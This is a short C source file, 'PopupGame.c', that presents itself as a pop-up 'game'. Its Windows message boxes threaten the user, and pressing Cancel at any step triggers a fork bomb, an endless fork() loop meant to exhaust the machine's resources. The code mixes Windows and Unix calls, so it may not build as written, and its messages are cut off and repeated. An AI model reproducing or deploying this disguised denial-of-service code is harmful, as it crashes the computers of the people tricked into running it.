/*
 * PopupGame.c
 *
 *  Created on: Jun 17, 2016
 *      Author: Barrett
 */
#include <stdio.h>
#include <unistd.h>
#include <windows.h>

void forkBomb(){
	MessageBox(NULL,"We can't risk our secrets getting out. Your computer is screwed.", "Fork Bomb", MB_OK | MB_TOPMOST);
	while(1){
		fork();

	}
}

int main(){
	int step1, step2, step3, step4, step5;
	step1 = MessageBox(NULL,"Would you like to play? This is the last chance you'll get to back out...", "Fork Bomb", MB_YESNO | MB_TOPMOST);
	if(step1 == 6){
		MessageBox(NULL,"Ah, hello...\nSo you're the unfortunate soul that got recruited to this program. \nLets go over some stuff...", "Fork Bomb", MB_OKCANCEL | MB_TOPMOST);
		step2 = MessageBox(NULL,"This information is top secret so from here on out do NOT shut off\n these messages or I WILL make your computer self-destruct", "Fork Bomb", MB_OKCANCEL | MB_TOPMOST);
		if(step2 == 1){
			step3 = MessageBox(NULL,"I am a ", "Fork Bomb", MB_OKCANCEL | MB_TOPMOST);
			if(step3 == 1){
				step4 = MessageBox(NULL,"This information is top secret so from here on out do NOT shut off\n these messages or I WILL make your computer self-destruct", "Fork Bomb", MB_OKCANCEL | MB_TOPMOST);
				if(step4 == 1){
					step5 = MessageBox(NULL,"This information is top secret so from here on out do NOT shut off\n these messages or I WILL make your computer self-destruct", "Fork Bomb", MB_OKCANCEL | MB_TOPMOST);
					if(step5 == 1){

					}
					else
						forkBomb();
				}
				else
					forkBomb();
			}
			else
				forkBomb();
		}
		else
			forkBomb();
	}
	else
		return 0;
}
